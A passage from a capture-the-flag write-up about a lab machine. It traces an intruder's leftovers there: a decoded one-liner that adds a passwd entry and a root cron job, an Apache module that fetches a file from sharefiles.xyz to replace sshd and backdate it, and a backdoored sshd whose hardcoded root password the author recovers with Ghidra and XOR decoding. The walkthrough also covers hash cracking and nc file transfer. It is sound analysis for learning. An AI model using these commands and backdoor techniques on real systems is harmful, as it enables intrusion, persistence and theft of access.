  <span class="mtk7">echo</span> <span class="mtk4">"</span><span class="mtk1">$user</span><span class="mtk4">"</span><span class="mtk1">1</span><span class="mtk4">":x:</span><span class="mtk1">$group</span><span class="mtk4">:</span><span class="mtk1">$group</span><span class="mtk4">:,,,:</span><span class="mtk1">$home</span><span class="mtk4">:</span><span class="mtk1">$shell</span><span class="mtk4">"</span> <span class="mtk5">&gt;&gt;</span> <span class="mtk1">/etc/passwd</span>
<span class="mtk5">done</span> <span class="mtk5">&lt;</span> <span class="mtk1">users.txt</span>

<span class="mtk1">rm</span> <span class="mtk1">users.txt</span>
</code></pre></div><p>First it is downloading a file called <code>.main</code>, storing it in <code>/var/lib/.main</code> and setting it to run every minute between 03:00 and 03:59 (that&rsquo;s what <code>* 3 * * *</code> means, check it out using <a href="https://crontab.cronhub.io/">crontab.cronhub.io</a>). Although <code>/etc/crontab</code> has this configuration set:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@production:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )  
#
* 3 * * * root /var/lib/.main
</code></pre></div><p>The file <code>/var/lib/.main</code> does not exist:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ ls -l /var/lib/.main
ls: cannot access '/var/lib/.main': No such file or directory  
</code></pre></div><h2 id="lateral-movement-to-user-steven">Lateral movement to user <code>steven</code></h2><p>Hence, let&rsquo;s continue with the &ldquo;one-liner&rdquo; command. Next, it adds a hashed password into <code>/etc/passwd</code> seting the username to <code>"$user"1</code>. It&rsquo;s clear that this refers to <code>steven1</code>. Let&rsquo;s crack the hashed password with <code>john</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">"steven1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::"</span> &gt; hash  

<span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt <span class="mtku">hash</span>
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
<span class="code-dark-yellow">ihatehackers</span>     (<span class="code-dark-yellow">steven1</span>)
1g 0:00:01:32 DONE 0.01078g/s 961.2p/s 961.2c/s 961.2C/s iloveyoudaddy..halo03
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
</code></pre></div><p>With this password, we can login as <code>steven1</code> using SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> steven1@10.10.11.146
steven1@10.10.11.146's password:
<span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ id
uid=1000(steven) gid=1000(steven) groups=1000(steven)  
<span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ cat user.txt
61bbcee605d3d4f5a4deef36b75c8126
</code></pre></div><p>Surprisingly, we are <code>steven</code> (not <code>steven1</code>). This happens because both users have the same user ID. Now that we have the <code>user.txt</code> flag, let&rsquo;s continue enumerating.</p><h2 id="apache-service-enumeration">Apache service enumeration</h2><p>This user has an email at <code>/var/mail/steven</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ find / -user steven 2&gt;/dev/null | grep -vE 'proc|sys|run'
/dev/pts/0
/var/mail/steven
/home/steven
/home/steven/.cache
/home/steven/.cache/motd.legal-displayed
/home/steven/.bashrc
/home/steven/user.txt
/home/steven/.profile
/home/steven/.local
/home/steven/.local/share
/home/steven/.local/share/nano
/home/steven/.ssh
/home/steven/.bash_logout
/home/steven/.bash_history
<span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ cat /var/mail/steven
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: &lt;root@production&gt;
Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
        for &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behavior with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.  
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
</code></pre></div><p>It says that Apache is behaving in a strange way. Maybe the binary file <code>/var/backups/info</code> has something to do. Let&rsquo;s take the date of last modification of this file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ ls -l /var/backups/info
-r-x------ 1 www-data www-data 27296 May 14  2021 <span class="code-green">/var/backups/info</span>  
</code></pre></div><p>Now we can search for files from Apache around that date, maybe we are right and the server is already comprimised:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ find / -newermt '2021-05-10' ! -newermt '2021-05-20' 2&gt;/dev/null | grep apache  
/usr/lib/<span class="code-red">apache</span>2/modules/mod_reader.so
/etc/<span class="code-red">apache</span>2/mods-available/reader.load
/etc/<span class="code-red">apache</span>2/mods-enabled/reader.load
</code></pre></div><p>Following these files, we end up with another 64-bit ELF:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ file /etc/apache2/mods-enabled/reader.load
/etc/apache2/mods-enabled/reader.load: symbolic link to ../mods-available/reader.load
<span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ file /etc/apache2/mods-available/reader.load
/etc/apache2/mods-available/reader.load: ASCII text
<span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ cat /etc/apache2/mods-enabled/reader.load
LoadModule reader_module      /usr/lib/apache2/modules/mod_reader.so
<span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ file /usr/lib/apache2/modules/mod_reader.so
/usr/lib/apache2/modules/mod_reader.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=e26fdc45e4b6561d29af8306c2be74f35ab140bb, with debug_info, not stripped  
</code></pre></div><p>This is a module loaded into Apache (maybe a backdoor). Again, let&rsquo;s transfer it to our machine using <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ nc 10.10.14.62 4444 &lt; /usr/lib/apache2/modules/mod_reader.so  
^C
<span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ md5sum /usr/lib/apache2/modules/mod_reader.so
5ef63371b6a138253a87aa1f79abf199  /usr/lib/apache2/modules/mod_reader.so
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444 &gt; mod_reader.so
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.146.
Ncat: Connection from 10.10.11.146:44820.

<span class="code-cyan">$</span> <span class="code-dark-green">md5sum</span> <span class="mtku">mod_reader.so</span>
5ef63371b6a138253a87aa1f79abf199  mod_reader.so  
</code></pre></div><p>Running <code>strings</code> in the binary results in another long string. This time it seems to be encoded in Base64 because we have numbers and letters (both uppercase and lowercase):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -120 <span class="mtku">mod_reader.so</span>
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk  

<span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -120 <span class="mtku">mod_reader.so</span> | <span class="code-dark-green">base64</span> -d
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
</code></pre></div><p>There is another &ldquo;one-liner&rdquo;, though this time is simpler:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">wget</span> <span class="mtk1">sharefiles.xyz/image.jpeg</span> <span class="mtk1">-O</span> <span class="mtk1">/usr/sbin/sshd</span>
<span class="mtk1">touch</span> <span class="mtk1">-d</span> <span class="mtk4">`date</span> <span class="mtk4">+%Y-%m-%d</span> <span class="mtk4">-r</span> <span class="mtk4">/usr/sbin/a2enmod`</span> <span class="mtk1">/usr/sbin/sshd</span>  
</code></pre></div><p>This time, it is downloading a file called <code>image.jpeg</code> and overwriting <code>/usr/sbin/sshd</code> (obviously, it is not a JPEG image). After that, it modifies the date of <code>/usr/sbin/sshd</code> to keep undetected.</p><p>Nice, so let&rsquo;s transfer <code>/usr/sbin/sshd</code> to our machine to analyze it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ nc 10.10.14.62 4444 &lt; /usr/sbin/sshd  
^C
<span class="code-green">steven@production</span>:<span class="code-blue">~</span>$ md5sum /usr/sbin/sshd
9ae629656c6f72dc957358b1f41df27e  /usr/sbin/sshd
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444 > sshd
Ncat: Version 7.92 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.146.
Ncat: Connection from 10.10.11.146:44820.
^C

<span class="code-cyan">$</span> <span class="code-dark-green">md5sum</span> <span class="mtku">sshd</span>
9ae629656c6f72dc957358b1f41df27e  sshd
</code></pre></div><h2 id="analyzing-sshd-reverse-engineering">Analyzing <code>sshd</code> (reverse engineering)</h2><p>We can open the file in Ghidra and look at the functions. Since it is a program that runs as daemon (that&rsquo;s the meaning of the <code>d</code> in <code>sshd</code>), this program exports some functions that will be used by other programs such as <code>ssh</code>.</p><p>Hence, we must look for exported functions. One of them is <code>auth_password</code>, which smells because we see a variable called <code>backdoor</code> (the binary is not stripped):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span> <span class="mtk8">auth_password</span><span class="mtk1">(ssh</span> <span class="mtk5">*</span><span class="mtk9 mtki">ssh</span><span class="mtk1">,</span> <span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk9 mtki">password</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk1">Authctxt</span> <span class="mtk5">*</span><span class="mtk1">ctxt;</span>
  <span class="mtk1">passwd</span> <span class="mtk5">*</span><span class="mtk1">ppVar1;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar2;</span>
  <span class="mtk7 mtki">uint</span> <span class="mtk1">uVar3;</span>
  <span class="mtk1">byte</span> <span class="mtk5">*</span><span class="mtk1">pbVar4;</span>
  <span class="mtk1">byte</span> <span class="mtk5">*</span><span class="mtk1">pbVar5;</span>
  <span class="mtk7 mtki">size_t</span> <span class="mtk1">sVar6;</span>
  <span class="mtk1">byte</span> <span class="mtk1">bVar7;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar8;</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">in_FS_OFFSET;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">backdoor[</span><span class="mtk6">31</span><span class="mtk1">];</span>
  <span class="mtk1">byte</span> <span class="mtk1">local_39[</span><span class="mtk6">9</span><span class="mtk1">];</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">local_30;</span>

  <span class="mtk1">bVar7</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">d6</span><span class="mtk1">;</span>
  <span class="mtk1">ctxt</span> <span class="mtk5">=</span> <span class="mtk1">(Authctxt</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">ssh-&gt;authctxt;</span>
  <span class="mtk1">local_30</span> <span class="mtk5">=</span> <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">(in_FS_OFFSET</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
  <span class="mtk1">backdoor._28_2_</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">a9f4</span><span class="mtk1">;</span>
  <span class="mtk1">ppVar1</span> <span class="mtk5">=</span> <span class="mtk1">ctxt-&gt;pw;</span>
  <span class="mtk1">iVar8</span> <span class="mtk5">=</span> <span class="mtk1">ctxt-&gt;valid;</span>
  <span class="mtk1">backdoor._24_4_</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">bcf0b5e3</span><span class="mtk1">;</span>
  <span class="mtk1">backdoor._16_8_</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">b2d6f4a0fda0b3d6</span><span class="mtk1">;</span>
  <span class="mtk1">backdoor[</span><span class="mtk6">30</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk5">-0x</span><span class="mtk6">5b</span><span class="mtk1">;</span>
  <span class="mtk1">backdoor._0_4_</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">f0e7abd6</span><span class="mtk1">;</span>
  <span class="mtk1">backdoor._4_4_</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">a4b3a3f3</span><span class="mtk1">;</span>
  <span class="mtk1">backdoor._8_4_</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">f7bbfdc8</span><span class="mtk1">;</span>
  <span class="mtk1">backdoor._12_4_</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">fdb3d6e7</span><span class="mtk1">;</span>
  <span class="mtk1">pbVar4</span> <span class="mtk5">=</span> <span class="mtk1">(byte</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">backdoor;</span>

  <span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pbVar5</span> <span class="mtk5">=</span> <span class="mtk1">pbVar4</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">;</span>
    <span class="mtk5">*</span><span class="mtk1">pbVar4</span> <span class="mtk5">=</span> <span class="mtk1">bVar7</span> <span class="mtk5">^</span> <span class="mtk5">0x</span><span class="mtk6">96</span><span class="mtk1">;</span>
    <span class="mtk5">if</span> <span class="mtk1">(pbVar5</span> <span class="mtk5">==</span> <span class="mtk1">local_39)</span> <span class="mtk5">break</span><span class="mtk1">;</span>
    <span class="mtk1">bVar7</span> <span class="mtk5">=</span> <span class="mtk5">*</span><span class="mtk1">pbVar5;</span>
    <span class="mtk1">pbVar4</span> <span class="mtk5">=</span> <span class="mtk1">pbVar5;</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar2</span> <span class="mtk5">=</span> <span class="mtk8">strcmp</span><span class="mtk1">(password,</span> <span class="mtk1">backdoor);</span>
  <span class="mtk1">uVar3</span> <span class="mtk5">=</span> <span class="mtk6">1</span><span class="mtk1">;</span>

  <span class="mtk5">if</span> <span class="mtk1">(iVar2</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">sVar6</span> <span class="mtk5">=</span> <span class="mtk8">strlen</span><span class="mtk1">(password);</span>
    <span class="mtk1">uVar3</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>

    <span class="mtk5">if</span> <span class="mtk1">(sVar6</span> <span class="mtk5">&lt;</span> <span class="mtk5">0x</span><span class="mtk6">401</span><span class="mtk1">)</span> <span class="mtk1">{</span>
      <span class="mtk5">if</span> <span class="mtk1">((ppVar1-&gt;pw_uid</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk5">&amp;&amp;</span> <span class="mtk1">(options.permit_root_login</span> <span class="mtk5">!=</span> <span class="mtk6">3</span><span class="mtk1">))</span> <span class="mtk1">{</span>
        <span class="mtk1">iVar8</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
      <span class="mtk1">}</span>

      <span class="mtk5">if</span> <span class="mtk1">((</span><span class="mtk5">*</span><span class="mtk1">password</span> <span class="mtk5">!=</span> <span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)</span> <span class="mtk5">||</span> <span class="mtk1">(uVar3</span> <span class="mtk5">=</span> <span class="mtk1">options.permit_empty_passwd,</span> <span class="mtk1">options.permit_empty_passwd</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">))</span> <span class="mtk1">{</span>  
        <span class="mtk5">if</span> <span class="mtk1">(auth_password::expire_checked</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
          <span class="mtk1">auth_password::expire_checked</span> <span class="mtk5">=</span> <span class="mtk6">1</span><span class="mtk1">;</span>
          <span class="mtk1">iVar2</span> <span class="mtk5">=</span> <span class="mtk8">auth_shadow_pwexpired</span><span class="mtk1">(ctxt);</span>

          <span class="mtk5">if</span> <span class="mtk1">(iVar2</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
            <span class="mtk1">ctxt-&gt;force_pwchange</span> <span class="mtk5">=</span> <span class="mtk6">1</span><span class="mtk1">;</span>
          <span class="mtk1">}</span>
        <span class="mtk1">}</span>

        <span class="mtk1">iVar2</span> <span class="mtk5">=</span> <span class="mtk8">sys_auth_passwd</span><span class="mtk1">(ssh,</span> <span class="mtk1">password);</span>

        <span class="mtk5">if</span> <span class="mtk1">(ctxt-&gt;force_pwchange</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
          <span class="mtk8">auth_restrict_session</span><span class="mtk1">(ssh);</span>
        <span class="mtk1">}</span>

        <span class="mtk1">uVar3</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">uint</span><span class="mtk1">)</span> <span class="mtk1">(iVar2</span> <span class="mtk5">!=</span> <span class="mtk6">0</span> <span class="mtk5">&amp;&amp;</span> <span class="mtk1">iVar8</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">);</span>
      <span class="mtk1">}</span>
    <span class="mtk1">}</span>
  <span class="mtk1">}</span>

  <span class="mtk5">if</span> <span class="mtk1">(local_30</span> <span class="mtk5">==</span> <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">(in_FS_OFFSET</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">))</span> <span class="mtk1">{</span>
    <span class="mtk5">return</span> <span class="mtk1">uVar3;</span>
  <span class="mtk1">}</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
  <span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">}</span>
</code></pre></div><p>Although Ghidra does something weird with <code>backdoor</code>, we can guess that it is a string (<code>char[31]</code>). We can join all the pieces to build the string, taking into account that <code>_0_4_</code> means from index <code>0</code> and <code>4</code> bytes long. Moreover, hexadecimal numbers must be formatted in littel-endian to become bytes.</p><p>There is a number <code>-0x5b</code> that must be put in positive because it must be a valid ASCII code (between 0 and 255, that is <code>0x00</code> and <code>0xff</code>). We need to compute the two&rsquo;s complement, which is the same as negating the number (in positive) and adding 1: <code>~(0x5b) + 1 = 0xa4 + 1 = 0xa5</code>.</p><p>We can use some packing functions from <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> to pack the numbers depending on the size of the number (i.e., <code>p64</code>, <code>p32</code>, <code>p16</code> or <code>p8</code>).</p><p>We see an instruction <code>strcmp(password, backdoor)</code> which might be comparing a password given to <code>ssh</code> with the <code>backdoor</code> variable we are working on. However, before doing the comparison, there is a cryptographic operation on <code>backdoor</code>.</p><p>The <code>while</code> loop is performing a XOR operation over every character of <code>backdoor</code> using <code>0x96</code> as key. To decrypt a XOR cipher, we must perform another XOR operation but between the ciphertext and the same key used to encrypt, that is <code>0x96</code>.</p><h2 id="privilege-escalation">Privilege escalation</h2><p>Now we have everything we need to get the expected password. We can use Python and <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> to compute the password:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python</span> -q
&gt;&gt;&gt; from pwn import p8, p16, p32, p64
&gt;&gt;&gt; backdoor  = p32(0xf0e7abd6)
&gt;&gt;&gt; backdoor += p32(0xa4b3a3f3)
&gt;&gt;&gt; backdoor += p32(0xf7bbfdc8)
&gt;&gt;&gt; backdoor += p32(0xfdb3d6e7)
&gt;&gt;&gt; backdoor += p64(0xb2d6f4a0fda0b3d6)
&gt;&gt;&gt; backdoor += p32(0xbcf0b5e3)
&gt;&gt;&gt; backdoor += p16(0xa9f4)
&gt;&gt;&gt; backdoor += p8(0xa5)
&gt;&gt;&gt; ''.join(map(lambda b: chr(b ^ 0x96), backdoor))  
'@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3'
</code></pre></div><p>Despite being unintelligible, if we provide this password for user <code>root</code>, we can access via SSH. Moreover, we can confirm that the machine was already comprimised because the cybercriminals got <code>root</code> access via SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> root@10.10.11.146
root@10.10.11.146's password:
root@production:~# cat root.txt
3afbb2e3f9d6f2329f00f41711a94cd8  
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#foothold-on-the-machine">Foothold on the machine</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#lateral-movement-to-user-steven">Lateral movement to user <code>steven</code></a></li><li><a href="#apache-service-enumeration">Apache service enumeration</a></li><li><a href="#analyzing-sshd-reverse-engineering">Analyzing <code>sshd</code> (reverse engineering)</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
